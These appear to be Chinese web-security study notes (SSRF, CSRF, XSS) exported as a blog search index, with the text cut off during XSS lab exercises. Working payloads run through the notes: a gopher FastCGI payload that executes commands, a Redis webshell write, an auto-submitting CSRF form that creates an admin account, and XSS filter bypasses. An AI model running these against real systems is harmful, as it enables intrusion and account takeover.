<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SSRF服务端请求伪造攻击]]></title>
    <url>%2Fnote%2F2020%2Fundefined07%2Fce4db0e6.html</url>
    <content type="text"><![CDATA[SSRF服务端请求伪造攻击SSRF漏洞概述什么是SSRF服务端请求伪造攻击（Server-sideRequestForgery）简称SSRF，当WEB应用提供了从其他服务器获取数据的功能，但没有对远程服务器地址和远程服务器返回的信息进行合理的验证和过滤，就可能存在这种服务端请求伪造。 SSRF漏洞可以做什么 可以扫描内部网络，获得端口、服务信息 1234?url=192.168.32.158:22http://10.20.65.13/?url=10.20.65.13:22?url=127.0.0.1:3306 对内网Web应用进行指纹识别，通过访问默认文件实现 对内部任意主机和任意端口发送精心构造的请求包进行攻击 (struts2、SQL注入) 利用file协议读取本地文件 1view-source：192.168.32.158：:8080/?url=file:///etc/passwd 越过网络防火墙 SSRF漏洞探测能够对外发起网络请求的地方，就可能存在SSRF 从远程服务器请求资源 (图片代下载) 转码服务 在线翻译 未公开的api实现以及其他调用URL的功能 数据库内置功能 Webmail收取其他邮箱邮件 (pop3,imap,smtp) 文件处理，编码处理，属性处理 (xmlrpc.xml) SSRF漏洞利用SSRF有关的函数PHP: 12341.file_get_contents()2.fsockopen()3.curl_exec()4.fopen() Python: urllib 库http头注入 requests等库中默认跟随30x跳转 SSRF常见利用–file://协议使用file协议读取源码敏感文件，配合fuzz字典，信息搜集 1view-source：192.168.32.158：:8080/1.php?url=file:///etc/passwd SSRF常见利用–dict://协议使用dict://协议刺探内网端口信息 SSRF常见利用–Gopher://协议 Gopher拓展攻击面： Gopher协议是HTTP协议出现之前，在Internet上常见且常用的一个协议。当然现在Gopher协议已经慢慢淡出历史。 Gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。这无疑极大拓宽了SSRF的攻击面。 SSRF+REDIS写入WEBSHEEL自动化神奇利用生成payloadhttps://github.com/tarunkant/Gopherus SSRF常见利用-urllib头注入攻击内网Redis SSRF常见利用-30x跳转利用http状态码30x来探测端口、服务 配合burp，即可快速探测。注意二次编码问题，理论上来讲，穿过几层就编码几次 常见中转脚本： 12&lt;?php header("Location:".$_GET["url"]);?&gt;&lt;?php header("Location:".$_GET['schema']."://".$_GET['host'].":".$_GET['port']."/".$_GET["url"]);?&gt; SSRF漏洞绕过SSRF常见绕过-短地址利用各大短地址生成平台，生成短的地址，绕过长度限制 SSRF常见绕过 -xip.ioxip.io是一个公开的DNS解析站，是一个由SamStephenson所提供的免费DNS转址，xip.io用于提供内网DNS解析，许多的套件都利用xip.io来做内网解析，如MAMP，功能就是将***.127.0.0.1.xip.io解析成127.0.0.1。 123410.0.0.1.xip.io resolvesto 10.0.0.1www.10.0.0.1.xip.io resolvesto 10.0.0.1mysite.10.0.0.1.xip.io resolvesto 10.0.0.1foo.bar.10.0.0.1.xip.io resolvesto 10.0.0.1 SSRF常见绕过-IP格式绕过十进制转换八进制转换十六进制转换不同进制组合转换 12345数字地址(十进制)：127.0.0.1-&gt;2130706433十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01八进制：127.0.0.1-&gt;0177.0.0.1或0177.00.00.01省略写法：127.0.0.1-&gt;127.1如127.0.0.1：http://localhost/ SSRF常见绕过-协议绕过当url协议限定只为http(s)时，可以利用followredirect特性构造302跳转服务file://localhost/etc/passwd在某些java环境下，file:///etc/passwd?1.jpg也是可以读取到 SSRF进阶利用-logDnslog没有办法获取回显的情况下，使用dnslog来获取回显无疑是个好办法 httplog使用http日志也可以方便的定位到存在ssrf的位置，以及ip等详细信息 SSRF进阶利用-time盲注的灵感:其实不只在sql注入和命令执行中有时间盲注，ssrf也有，端口开放不开放产生的时间延迟说不定也有规律可寻 SSRF进阶利用-dns rebinding 差异化导致的问题不同的语言和库对url的识别不用，也会导致问题的产生。 SSRF实战探测内网题目： 可以探测外网：http://10.20.25.44/?url=https://www.qq.com 探测内网c段：http://10.20.25.44/?url=file:///etc/hosts 1234567891011121314&lt;?phphighlight_file(__FILE__);if(isset($_GET['url'])) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //如果把这行注释掉的话，就会直接输出 $result=curl_exec($ch); curl_close($ch); echo($result);&#125;127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.17.0.2 1efb3a2d4c9e 尝试访问http://10.20.25.44/?url=172.17.0.3 1234567891011121314&lt;?phphighlight_file(__FILE__);if(isset($_GET['url'])) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); curl_setopt($ch, CURLOPT_HEADER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //如果把这行注释掉的话，就会直接输出 $result=curl_exec($ch); curl_close($ch); echo($result);&#125;flag&#123;ssrf1_37863789u82&#125; gopherus –exploit redis 项目地址：https://github.com/Beipy/BeipyVideoResolution 题目：http://10.20.25.44:82/ SSRF 打 redis, redis 密码 root 审计代码，看到 data/title.php 中有 SSRF 点，且为 curl，可以请求 gopher://。 所以使用gopherus生成payload，注意参数： 进行解码： 因为redis需要密码登录，所以我们需要修改payload 加入密码root 回到scripts/目录下，编辑Redis.py 注意要改的是下面shell的，不是上面反弹shell的 加入下面的： 123456789*2\r$4\rauth\r$4\rroot\r\r 是回车*2 表示增加两个参数$4 表示占四个字节 本质是在你发送的命令前执行 auth &lt;密码&gt; 命令通过服务器的密码验证，从而继续执行后面的命令。 注意改的时候一定记得字节长度要匹配： 重新生成payload： 再编码一次： 上传payload： 访问：http://10.20.25.44:82/wfbww.php 然后加上：/wfbww.php?a=system(&#39;cat /flag&#39;);就可以得到flag 要不要编码要看content type 是urlencoded就已经自动解码过了，所以要再编一次 get会自动解码一次所以要再编码一次 gopherus –exploit fastcgihttp://10.20.25.44:84/ 打 php-fpm 首先访问http://10.20.25.44:91/?url=gopher://127.0.0.1/9000发现在加载，说明开启了相应端口 用工具生成payload: 1gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 因为是GET形式会自动解码一次所以要去url编码得到: 1%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%39%30%30%30%2f%5f%25%30%31%25%30%31%25%30%30%25%30%31%25%30%30%25%30%38%25%30%30%25%30%30%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%31%25%30%34%25%30%34%25%30%30%25%30%46%25%31%30%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%67%6f%25%32%30%2f%25%32%30%66%63%67%69%63%6c%69%65%6e%74%25%32%30%25%30%42%25%30%39%52%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%25%30%46%25%30%38%53%45%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%2f%31%2e%31%25%30%45%25%30%32%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%54%48%35%36%25%30%45%25%30%34%52%45%51%55%45%53%54%5f%4d%45%54%48%4f%44%50%4f%53%54%25%30%39%4b%50%48%50%5f%56%41%4c%55%45%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%25%32%30%25%33%44%25%32%30%4f%6e%25%30%41%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%25%32%30%25%33%44%25%32%30%25%30%41%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%25%32%30%25%33%44%25%32%30%70%68%70%25%33%41%2f%2f%69%6e%70%75%74%25%30%46%25%31%37%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%69%6e%64%65%78%2e%70%68%70%25%30%44%25%30%31%44%4f%43%55%4d%45%4e%54%5f%52%4f%4f%54%2f%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%35%25%30%30%25%30%31%25%30%30%38%25%30%34%25%30%30%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%37%6c%73%25%32%30%2f%25%32%37%25%32%39%25%33%42%64%69%65%25%32%38%25%32%37%2d%2d%2d%2d%2d%4d%61%64%65%2d%62%79%2d%53%70%79%44%33%72%2d%2d%2d%2d%2d%25%30%41%25%32%37%25%32%39%25%33%42%25%33%46%25%33%45%25%30%30%25%30%30%25%30%30%25%30%30 上传payload: 发现执行了ls /命令，根目录下有ffffffffffllllllllaaagggggg文件 重新生成cat /ffffffffffllllllllaaagggggg命令的payload并再次URL编码： 上传payload得到flag: 类似题目：https://www.cnblogs.com/zaqzzz/p/11975948.html]]></content>
      <categories>
        <category>Penetration Test</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF跨站请求伪造攻击]]></title>
    <url>%2Fnote%2F2020%2Fundefined06%2Fecd34c17.html</url>
    <content type="text"><![CDATA[CSRF跨站请求伪造漏洞简介攻击者盗⽤了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成 了攻击者所期望的⼀个操作，⽐如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚 ⾄于购买商品、虚拟货币转账等。 类⽐成语：借⼑杀⼈ ⼀般伪造身份中，这把“⼑”就是受害者的Cookie信息，⽤受害者的Cookie来做⼀些违规的事情。 Cookie正常交互流程 ⽤户输⼊密码 -&gt; 服务器 服务器 -&gt; Cookie ⽤户使⽤Cookie -&gt; 登陆系统 修改Cookie 使⽤Burp抓包改包 审查元素修改 漏洞分类GET型如果⼀个⽹站某个地⽅的功能，⽐如⽤户修改邮箱是通过GET请求进⾏修改的。如： 1/user.php?id=1&amp;email=123@163.com 这个链接的意思是⽤户id=1将邮箱修改为`123@163.com`。 当我们把这个链接修改为 1/user.php?id=1&amp;email=abc@163.com 然后通过各种⼿段发送给被攻击者，诱使被攻击者点击我们的链接，当⽤户刚好在访问这个⽹站，他同 时⼜点击了这个链接，那么悲剧发⽣了。这个⽤户的邮箱被修改为 1abc@163.com POST型在普通⽤户的眼中，点击⽹⻚-&gt;打开试看视频-&gt;购买视频是⼀个很正常的⼀个流程。可是在攻击者的眼 中可以算正常，但⼜不正常的，当然不正常的情况下，是在开发者安全意识不⾜所造成的。攻击者在购 买处抓到购买时候⽹站处理购买(扣除)⽤户余额的地址。⽐如： 1/coures/user/handler/25332/buy.php 通过提交表单，buy.php处理购买的信息，这⾥的25532为视频ID。那么攻击者现在构造⼀个链接，链接中包含以下内容。 1234&lt;form action=/coures/user/handler/25332/buy method=POST&gt;&lt;input type="text" name="xx" value="xx" /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 当⽤户访问该⻚⾯后，表单会⾃动提交，相当于模拟⽤户完成了⼀次POST操作，⾃动购买了id为25332 的视频，从⽽导致受害者余额扣除。 CSRF构造技巧 Burpsuite其实已经⾃带的Generate CSRF PoC，在抓包的时候，右键，可以直接⽣成⼀个CSRF的 表单，这个时候只需要讲这个表单发给受害者，然后受害者去访问触发即可。Burpsuite⽣成的表单默认是有提交按钮的，下⾯是⼀个测试的代码： 12345678910111213141516171819202122232425&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action="http://127.0.0.1/zblog/zb_system/cmd.php? act=ArticlePst&amp;csrfToken=8afa14acf50cdc6983f15a234d598644" method="POST"&gt; &lt;input type="hidden" name="ID" value="0" /&gt; &lt;input type="hidden" name="Type" value="0" /&gt; &lt;input type="hidden" name="Title" value="CSRF" /&gt; &lt;input type="hidden" name="Content" value="" /&gt; &lt;input type="hidden" name="Alias" value="" /&gt; &lt;input type="hidden" name="Tag" value="" /&gt; &lt;input type="hidden" name="Intro" value="" /&gt; &lt;input type="hidden" name="CateID" value="1" /&gt; &lt;input type="hidden" name="Status" value="0" /&gt; &lt;input type="hidden" name="Template" value="single" /&gt; &lt;input type="hidden" name="AuthorID" value="1" /&gt; &lt;input type="hidden" name="PostTime" value="2019&amp;#45;06&amp;#45;04&amp;#32;18&amp;#58;54&amp;#58;32" /&gt; &lt;input type="hidden" name="IsTop" value="0" /&gt; &lt;input type="hidden" name="IsLock" value="0" /&gt; &lt;input type="hidden" name="Intro" value="" /&gt; &lt;input type="hidden" name="Content" value="This&amp;#32;a&amp;#32;csrf&amp;#32;ariticle&amp;lt;br&amp;#47;&amp;gt;&amp;lt;p&amp;gt;&amp;lt;br&amp;#47;&amp;gt; &amp;lt;&amp;#47;p&amp;gt;" /&gt; &lt;input type="submit" value="Submit request" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 这是Zblog发布⽂章的⼀个数据包⽣成的CSRF表单，点击Copy HTML将这个⽂件放到HTML⽂件中去访 问，效果如下: 受害者必须点击这个按钮才可以触发构造好的表单内容，这⼀点对于真实的钓⻥是⼀件很不友好的事 情，所以我们得在Burpsuite的基础上⼆次修改表单，让管理员访问这个⻚⾯的时候直接就可以触发 这个精⼼构造好的表单。 实际上只需要⼀⾏JavaScript代码即可实现这个效果: 1&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 有了这个⾃动提交表单，可以把按钮元素直接删掉，这样可以更隐⾼效地攻击，删掉如下内容： 1&lt;input type="submit" value="Submit request" /&gt; 这样当管理员访问这个这个HTML⽂件的时候，⻚⾯加载完就会⾃动提交表单，⼀瞬间就可以触发. CSRF实战https://bbs.xiuno.com/ Xiuno BBS 4.0 是⼀款轻论坛产品，前端基于 BootStrap 4.0、JQuery 3，后端基于 PHP/7 MySQL XCache/Yac/Redis/Memcached…，⾃适应⼿机、平板、PC，有着⾮常⽅便的插件机制，不仅仅是⼀个 轻论坛，还是⼀个良好的⼆次开发平台。 首先本地搭好这个cms: 登录管理员账号访问并创建账户： bp抓包做poc: 名为csrf.html放到本地网站根目录 把action后面修改成目标网站： 12345678910111213&lt;html&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action="http://10.20.24.244:8089/admin/?user-create.htm" method="POST"&gt; &lt;input type="hidden" name="email" value="wfb&amp;#64;qq&amp;#46;com" /&gt; &lt;input type="hidden" name="username" value="wfb" /&gt; &lt;input type="hidden" name="password" value="wfb" /&gt; &lt;input type="hidden" name="&amp;#95;gid" value="1" /&gt; &lt;input type="submit" value="Submit request" /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 注册账号登录目标网站，发表文章等待管理员点击链接： 创建成功，使用之前抓包时的账号密码登录后台：]]></content>
      <categories>
        <category>Penetration Test</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击]]></title>
    <url>%2Fnote%2F2020%2Fundefined05%2Fdb4b83e4.html</url>
    <content type="text"><![CDATA[XSS跨站脚本攻击XSS简介XSS攻击指黑客通过特殊的手段往网页中插入了恶意的JavaScript脚本，从而在用户浏览网页时，对用户浏览器发起Cookie资料窃取、会话劫持、钓鱼欺骗等各攻击。 XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。 XSS跨站脚本攻击漏洞也是OWASP Top 10中经常出现的对象，造成XSS漏洞普遍流行的原因如下: Web浏览器本身的设计不安全，无法判断JS代码是否是恶意的 输入与输出的Web应用程序基本交互防护不够 程序员缺乏安全意识，缺少对XSS漏洞的认知 XSS触发简单，完全防御起来相当困难 XSS跨站脚本实例下面的HTML代码就演示了一个最基本的XSS弹窗： 123456&lt;html&gt;&lt;head&gt;XSS&lt;/head&gt;&lt;body&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; / 正斜杠也可以弹窗 &lt;script&gt;alert(document.cookie)&lt;/script&gt;弹cooike 该代码直接再HTML页面通过&lt;script&gt;标签来执行了javaScript内置的alert()函数，达到弹出消息框弹窗的效果： XSS攻击就是将非法的JavaScript代码注入到用户浏览的网页上执行，而Web浏览器本身的设计是不安全的，它只负责解释和执行JavaScript等脚本语言，而不会判断代码本身是否对用户有害。 XSS的危害诚然，XSS可能不如SQL注射、文件上传等能够直接得到较高操作权限的漏洞，但是它的运用十分灵活（这使它成为最深受黑客喜爱的攻击技术之一），只要开拓思维，适当结合其他技术一起运用，XSS的威力还是很大的。可能会给网站和用户带来的危害简单概括如下： 网络钓鱼 盗取用户cookies信息 劫持用户浏览器 强制弹出广告页面、刷流量 网页挂马 进行恶意操作，例如任意篡改页面信息 获取客户端隐私信息 控制受害者机器向其他网站发起攻击 结合其他漏洞，如CSRF漏洞，实施进一步作恶 提升用户权限，包括进一步渗透网站 传播跨站脚本蠕虫等 XSS分类反射型XSS（非持久型）反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。 假设一个页面把用户输入的参数直接输出到页面上： 1234&lt;?php$input = $_GET['param'];echo "&lt;h1&gt;".$input."&lt;/h1&gt;";?&gt; 用户向param提交的数据会展示到&lt;h1&gt;的标签中展示出来，比如提交: 1http://127.0.0.1/test.php?param=Hello XSS 会得到如下结果: 此时查看页面源代码，可以看到： 1&lt;h1&gt;Hello XSS&lt;/h1&gt; 此时如果提交一个JavaScript代码: 1http://127.0.0.1/test.php?param=&lt;script&gt;alert(233)&lt;/script&gt; 会发现，alert(233)在当前页面执行了： 再查看源代码： 1&lt;h1&gt;&lt;script&gt;alert(233)&lt;/script&gt;&lt;/h1&gt; 用户输入的Script脚本，已经被写入页面中，这个就是一个最经典的反射型XSS，它的特点是只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型XSS。反射型XSS的危害往往不如持久型XSS，因为恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发，稍微有点安全意识的用户可以轻易看穿该链接是不可信任的。如此一来，反射型XSS的攻击成本要比持久型XSS高得多，不过随着技术的发展，我们可以将包含漏洞的链接通过短网址缩短或者转换为二维码等形式灵活运用。 存储XSS（持久型）存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子是留言板XSS。 为了复现存储型XSS，这里我们得用到数据库，本地新建一个名字叫做xss的数据库，里面新建一个message表，用来存放用户的留言信息，字段名分别是id、username、message id设为主键，并勾选自动递增 ，也可以参考下面的sql语句来设计表： 123456789101112SET NAMES utf8mb4;SET FOREIGN_KEY_CHECKS = 0DROP TABLE IF EXISTS `message`;CREATE TABLE `message` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `message` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, PRIMARY KEY (`id`) USING BTREE) ENGINE = MyISAM AUTO_INCREMENT = 17 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;SET FOREIGN_KEY_CHECKS = 1; 目前数据库方面设计完了，开始着手写PHP后端页面，来复现一下存储型XSS漏洞： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;meta charset=&quot;utf-8&quot;&gt;&lt;?php/*数据库信息配置*/$host = &quot;localhost&quot;; //数据库地址$port = &quot;3306&quot;; //数据库端口$user = &quot;root&quot;; //数据库用户名$pwd = &quot;root&quot;; //数据库密码$dbname = &quot;xss&quot;; //数据库名$conn = new mysqli($host,$user,$pwd,$dbname,$port);?&gt;&lt;!-- 前端用户输入表单 --&gt;&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;&lt;form method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;姓名&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;message&quot; placeholder=&quot;请输入您的留言&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php /*直接将留言插入到数据库中*/ $username=$_POST[&apos;username&apos;]; $message=$_POST[&apos;message&apos;]; if($username and $message) &#123; $sql=&quot;INSERT INTO `message`(`username`, `message`) VALUES (&apos;&#123;$username&#125;&apos;,&apos;&#123;$message&#125;&apos;)&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;; &#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error; &#125; &#125;else&#123; echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;; &#125; /*查询数据库中的留言信息*/ $sql = &quot;SELECT username, message FROM message&quot;; $result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; echo &quot;用户名：&quot; . $row[&quot;username&quot;]. &quot;留言内容:&quot; . $row[&quot;message&quot;].&quot;&lt;br&gt;&quot;; &#125; &#125; else &#123; echo &quot;暂无留言&quot;; &#125;?&gt; 将以上代码保存为php文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面： 可以从代码看出，逻辑很简单，用户前端留言，就可以看到自己的留言信息了，代码中没有任何过滤，直接将用户的输入的语句插入到了html网页中，这样就很容易导致存储型XSS漏洞的产生。 当攻击者直接在留言板块插入&lt;script&gt;alert(&#39;鸡你太美&#39;)&lt;/script&gt;，会导致这条恶意的语句直接插入到了数据库中，然后通过网页解析，成功触发了JS语句，导致用户浏览这个网页就会一直弹窗，除非从数据库中删除这条语句： 此时查看下网页源码： 1&lt;b&gt;用户名：&lt;/b&gt;蔡徐坤 &lt;b&gt;留言内容:&lt;/b&gt;&lt;script&gt;alert('鸡你太美')&lt;/script&gt;&lt;br&gt; 存储型XSS的攻击是最隐蔽的也是危害比较大的，普通用户所看的URL为http://127.0.0.1/test.php，从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。 持久：只要不清除数据库数据，每次访问就会一直弹窗 DOM型 XSS通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。 下面编写一个简单的含有DOM XSS漏洞的HTML代码： 12345678910111213&lt;meta charset="UTF-8"&gt;&lt;script&gt; function xss()&#123; var str = document.getElementById("src").value; document.getElementById("demo").innerHTML = "&lt;img src='"+str+"' /&gt;"; &#125;&lt;/script&gt;&lt;input type="text" id="src" size="50" placeholder="输入图片地址" /&gt;&lt;input type="button" value="插入" onclick="xss()" /&gt;&lt;br&gt;&lt;div id="demo" &gt;&lt;/div&gt; 功能很简单，用户输入框插入图片地址后，页面会通过&lt;img&gt;标签将插入的图片显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 123&apos; onerror=alert(233)//&apos;x&apos; onerror=alert(233) x=&apos; 会直接在&lt;img&gt;标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的alert()函数，来达到弹窗的效果，这就是一个最简单的DOM型XSS漏洞。 XSS靶场搭建本节主要是搭建一些靶场，因为大家都是搞信息安全的，所以靶场搭建的话我这里就不重复造轮子，通过搜索引擎可以找到很多图文并茂的教程，所以本节里面只做概括的作用。 Web For Pentester官网：https://pentesterlab.com/ 下载地址：https://isos.pentesterlab.com/web_for_pentester_i386.iso DVWA官网：http://www.dvwa.co.uk/ 下载地址：https://github.com/ethicalhack3r/DVWA/archive/master.zip 安装方法：将/config/config.inc.php.dist文件重命名为/config/config.inc.php ，本地新建一个名字叫做dvwa的数据库，根据本地实际环境的信息，修改配置文件信息如下：（填写key这里是可选的操作）： 1234567$_DVWA[ 'db_server' ] = '127.0.0.1';$_DVWA[ 'db_database' ] = 'dvwa';$_DVWA[ 'db_user' ] = 'root';$_DVWA[ 'db_password' ] = 'root';$_DVWA[ 'recaptcha_public_key' ] = '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';$_DVWA[ 'recaptcha_private_key' ] = '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ'; 我本地使用的是PHPStudy搭建的环境，找到PHP扩展及设置-参数开关设置，勾选 12allow_url_fopenallow_url_include 浏览器访问DVWA的目录来进行安装： 1http://127.0.0.1/DVWA/setup.php 点击Create / Reset Databas创建数据库，接着跳转到登录界面。 默认的账户名为：admin，密码为：password XSS小游戏项目地址：https://github.com/sqlsec/xssgame 安装方法：直接解压源码到HTTP服务的目录下，浏览器直接访问即可，无需配置数据库等信息 WebforPentester习题讲解第1关 无任何过滤源码 123&lt;?php echo $_GET["name"];?&gt; name变量直接通过GET方式传进去，然后通过echo输出。 payload 1example1.php?name=&lt;script&gt;alert('XSS')&lt;/script&gt; 第2关 大小写绕过源码 123456&lt;?php $name = $_GET[&quot;name&quot;]; $name = preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;, $name); $name = preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;, $name);echo $name;?&gt; 使用了preg_replace函数来过滤&lt;script&gt;和&lt;/script&gt;标签，这里由于正则缺陷，没有考虑到大小写的情况，所以这里可以用大小写转换绕过。 payload 123example2.php?name=&lt;Script&gt;alert(&apos;XSS&apos;)&lt;/scripT&gt;# 也可以双写嵌套example2.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(&apos;XSS&apos;)&lt;/scr&lt;/script&gt;ipt&gt; 第3关 嵌套绕过源码 123456&lt;?php $name = $_GET[&quot;name&quot;]; $name = preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;, $name); $name = preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;, $name);echo $name;?&gt; 这里在第2关的基础上面，正则规则上面使用了/i，表示不区分大小写，利用这个特点可以构造一个嵌套的标签： 1&lt;scr&lt;script&gt;ipt&gt; 被检测到&lt;script&gt;后，替换为了空（即删掉）就变成了一个完整的标签： 1&lt;script&gt; payload 1example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(&apos;XSS&apos;)&lt;/&lt;/script&gt;script&gt; 第4关 其他标签绕过源码 12345678&lt;?php require_once &apos;../header.php&apos;;if (preg_match(&apos;/script/i&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;error&quot;);&#125;?&gt;Hello &lt;?php echo $_GET[&quot;name&quot;]; ?&gt; 对script关键词进行了不区分大小写地过滤，匹配到就直接调用die(&quot;error&quot;)终止程序运行，因此上述的方法就不再适用，但是还可以通过其他许多标签来触发JS事件。 payload 1example4.php?name=&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt; 第5关 编码或者其他方法绕过源码 12345678&lt;?php require_once &apos;../header.php&apos;;if (preg_match(&apos;/alert/i&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;error&quot;);&#125;?&gt;Hello &lt;?php echo $_GET[&quot;name&quot;]; ?&gt; 对alert关键词进行了不区分大小写地过滤，可以使用其他类似alert的方法来弹窗 payload1 12example5.php?name=&lt;script&gt;confirm(&apos;XSS&apos;)&lt;/script&gt;example5.php?name=&lt;script&gt;prompt(&apos;XSS&apos;)&lt;/script&gt; 也可以通过String.fromCharCode()编码来绕过，使用Hackbar可以很方便地进行编码 1alert(&apos;XSS&apos;) 经过String.fromCharCode()编码为: 1String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41) payload2 1example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41))&lt;/script&gt; 第6关 闭合双引号源码 123&lt;script&gt; var $a= &quot;&lt;?php echo $_GET[&quot;name&quot;]; ?&gt;&quot;;&lt;/script&gt; 通过GET方式传入的name变量，直接输出在了script标签里面，可以尝试闭合前面的双引号&quot;，然后直接调用alert方法来弹窗，末尾再使用双引号&quot;闭合后面的双引号。 payload1 1example6.php?name=&quot;;alert(&apos;XSS&apos;);&quot; 也可以尝试通过//直接注释掉后面的双引号&quot;，这样就不用考虑闭合了： payload2 1example6.php?name=&quot;;alert(&apos;XSS&apos;);// 第7关 闭合单引号源码 123&lt;script&gt; var 